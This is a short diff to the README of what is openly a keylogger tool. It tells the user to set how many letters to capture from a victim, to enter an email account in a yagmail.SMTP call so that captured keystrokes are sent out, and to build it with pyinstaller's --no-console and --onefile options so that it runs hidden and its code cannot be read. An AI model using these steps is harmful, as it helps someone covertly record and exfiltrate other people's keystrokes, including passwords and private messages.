@@ -25,6 +25,10 @@ open keylogger.py and enter the number of letters you wanna capture through vict
 ```
 Enter the numbers here in the if loop :-- if len(a)==10 (default value is set as 10)
 ```
+Enter your email id and password here
+```
+yagmail.SMTP(user='',password='')
+```
 Using the pyinstaller is optioanl. Pyinstaller creates your python file into executable format (.exe in  Windows and .elf in Linux) which also makes your python file unreadable
 ```
 pyinstaller keylogger.py --no-console --onefile 
